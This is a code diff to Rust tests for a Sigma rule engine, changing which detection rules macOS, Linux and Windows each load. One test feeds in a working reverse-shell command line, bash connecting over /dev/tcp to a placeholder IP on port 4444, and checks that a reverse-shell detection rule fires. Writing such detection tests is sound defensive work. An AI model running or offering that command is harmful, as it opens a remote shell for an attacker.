@@ -9,6 +9,15 @@ use sigma::{Platform, SigmaEngine};
 
 const ALL: [Platform; 3] = [Platform::Linux, Platform::Windows, Platform::MacOs];
 
+/// The rules each host runs on a `tree`: **the one place this set is pinned** (#980). macOS runs
+/// the Unix-family rules of `linux/` as well as its own; Linux and Windows run only their own.
+/// Changing it is a choice: a shared `unix/` directory is the alternative.
+const EXPECTED: [(Platform, &[&str]); 3] = [
+    (Platform::Linux, &["linux-rule"]),
+    (Platform::Windows, &["windows-rule"]),
+    (Platform::MacOs, &["linux-rule", "macos-rule"]),
+];
+
 fn rule(title: &str) -> String {
     format!(
         "title: {title}\ndescription: d\ntags:\n  - attack.t1059\nlevel: low\nfalsepositives:\n  - none\n\
@@ -43,13 +52,9 @@ fn titles(engine: &SigmaEngine) -> Vec<String> {
 fn each_platform_loads_only_its_own_directory() {
     let dir = tempfile::tempdir().unwrap();
     tree(dir.path());
-    for (platform, title) in [
-        (Platform::Linux, "linux-rule"),
-        (Platform::Windows, "windows-rule"),
-        (Platform::MacOs, "macos-rule"),
-    ] {
+    for (platform, expected) in EXPECTED {
         let engine = SigmaEngine::load_dir_for(dir.path(), platform).unwrap();
-        assert_eq!(titles(&engine), [title], "{platform:?}");
+        assert_eq!(titles(&engine), expected, "{platform:?}");
     }
 }
 
@@ -66,13 +71,9 @@ fn a_platform_word_in_the_content_root_does_not_change_a_rules_platform() {
         .join("rules")
         .join("sigma");
     tree(&root);
-    for (platform, title) in [
-        (Platform::Linux, "linux-rule"),
-        (Platform::Windows, "windows-rule"),
-        (Platform::MacOs, "macos-rule"),
-    ] {
+    for (platform, expected) in EXPECTED {
         let engine = SigmaEngine::load_dir_for(&root, platform).unwrap();
-        assert_eq!(titles(&engine), [title], "{platform:?}");
+        assert_eq!(titles(&engine), expected, "{platform:?}");
     }
 }
 
@@ -106,8 +107,14 @@ fn a_rule_outside_a_platform_directory_is_loaded_for_no_platform() {
 fn a_platform_directory_that_does_not_exist_gives_an_engine_with_no_rules() {
     let dir = tempfile::tempdir().unwrap();
     write(dir.path(), "linux/a.yml", "linux-rule");
-    let engine = SigmaEngine::load_dir_for(dir.path(), Platform::MacOs).unwrap();
+    let engine = SigmaEngine::load_dir_for(dir.path(), Platform::Windows).unwrap();
     assert_eq!(engine.rule_count(), 0);
+    // macOS without a `macos/` directory still runs `linux/`; with neither, it runs nothing.
+    let mac = SigmaEngine::load_dir_for(dir.path(), Platform::MacOs).unwrap();
+    assert_eq!(titles(&mac), ["linux-rule"]);
+    let empty = tempfile::tempdir().unwrap();
+    let none = SigmaEngine::load_dir_for(empty.path(), Platform::MacOs).unwrap();
+    assert_eq!(none.rule_count(), 0);
 }
 
 #[test]
@@ -151,6 +158,9 @@ fn the_host_platform_is_known_on_the_systems_the_content_covers() {
     assert_eq!(Platform::Linux.dir_name(), "linux");
     assert_eq!(Platform::Windows.dir_name(), "windows");
     assert_eq!(Platform::MacOs.dir_name(), "macos");
+    assert_eq!(Platform::Linux.rule_dirs(), ["linux"]);
+    assert_eq!(Platform::Windows.rule_dirs(), ["windows"]);
+    assert_eq!(Platform::MacOs.rule_dirs(), ["macos", "linux"]);
 }
 
 // ── the shipped content ──────────────────────────────────────────────────────
@@ -176,20 +186,57 @@ fn rule_files(dir: &Path) -> usize {
 }
 
 #[test]
-fn the_shipped_content_splits_exactly_by_platform() {
-    let all = SigmaEngine::load_dir(&content_dir()).unwrap().rule_count();
-    let mut sum = 0;
-    for platform in ALL {
-        let engine = SigmaEngine::load_dir_for(&content_dir(), platform).unwrap();
-        let on_disk = rule_files(&content_dir().join(platform.dir_name()));
-        assert!(on_disk > 0, "{platform:?} ships no rules");
-        assert_eq!(engine.rule_count(), on_disk, "{platform:?}");
-        sum += engine.rule_count();
+fn the_shipped_content_splits_as_the_expected_set_says() {
+    let dir = content_dir();
+    let count = |name: &str| rule_files(&dir.join(name));
+    for (platform, own) in [
+        (Platform::Linux, count("linux")),
+        (Platform::Windows, count("windows")),
+        // macOS runs its own rules and those of `linux/`.
+        (Platform::MacOs, count("macos") + count("linux")),
+    ] {
+        let engine = SigmaEngine::load_dir_for(&dir, platform).unwrap();
+        assert!(own > 0, "{platform:?} ships no rules");
+        assert_eq!(engine.rule_count(), own, "{platform:?}");
     }
+    // Windows loads nothing of the Unix-family content, and Linux nothing of macOS's or Windows's.
+    let windows = SigmaEngine::load_dir_for(&dir, Platform::Windows).unwrap();
+    let linux = SigmaEngine::load_dir_for(&dir, Platform::Linux).unwrap();
+    let mac = SigmaEngine::load_dir_for(&dir, Platform::MacOs).unwrap();
+    let in_both = |a: &SigmaEngine, b: &SigmaEngine| {
+        a.rule_titles()
+            .iter()
+            .filter(|t| b.rule_titles().contains(t))
+            .count()
+    };
+    assert_eq!(in_both(&windows, &linux), 0);
+    assert_eq!(in_both(&windows, &mac), 0);
     assert_eq!(
-        sum, all,
-        "every shipped rule belongs to exactly one platform"
+        in_both(&linux, &mac),
+        linux.rule_count(),
+        "every Linux rule runs on macOS too"
     );
+}
+
+#[test]
+fn a_linux_rule_runs_on_macos_and_not_on_windows() {
+    // `reverse_shell` is a `linux/` rule on `bash -i >& /dev/tcp/...`.
+    const LINUX_RULE: &str = "Reverse shell via /dev/tcp or nc/ncat with execution";
+    let mut event = exec("/usr/bin/x", "/bin/bash");
+    event.cmdline = "bash -i >& /dev/tcp/203.0.113.9/4444 0>&1".into();
+    let fires = |platform| {
+        SigmaEngine::load_dir_for(&content_dir(), platform)
+            .unwrap()
+            .eval_exec(&event)
+            .iter()
+            .any(|a| a.title == LINUX_RULE)
+    };
+    assert!(fires(Platform::Linux));
+    assert!(
+        fires(Platform::MacOs),
+        "macOS keeps running the Unix-family rules of linux/"
+    );
+    assert!(!fires(Platform::Windows));
 }
 
 fn exec(parent: &str, image: &str) -> ExecEvent {
